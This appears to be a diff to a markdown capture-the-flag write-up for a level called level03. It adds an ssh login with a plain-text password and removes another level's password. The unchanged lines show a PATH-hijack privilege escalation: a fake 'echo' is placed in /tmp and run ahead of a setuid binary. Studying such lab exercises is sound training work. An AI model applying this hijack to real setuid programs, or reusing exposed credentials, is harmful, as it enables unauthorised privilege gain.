@@ -208,9 +208,17 @@ print('res/', res)
 
 # 03
 
-- Inspect
-  - ❌ `file` `readelf` `strings` 
-  - ✅ `ltrace` 
+Login
+
+```b
+> ssh level03@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
+> Password: kooda2puivaav1idi4f57q8iq
+```
+
+Inspect
+- ❌ `file` `readelf` `strings` 
+- ✅ `ltrace` 
+
 ```
 > ls -l
 -rwsr-sr-x 1 flag03 level03 8627 level03
@@ -271,13 +279,6 @@ getflag: /bin/getflag
 > chmod +x /tmp/echo
 > export PATH=/tmp:$PATH  👈 prepend tmp to get it checked first
 > ./level03
-```
-
-- Token
-
-```b
-> su level04
-> Password: qi0maab88jeaj46qoumi7maus
 ```
 
 
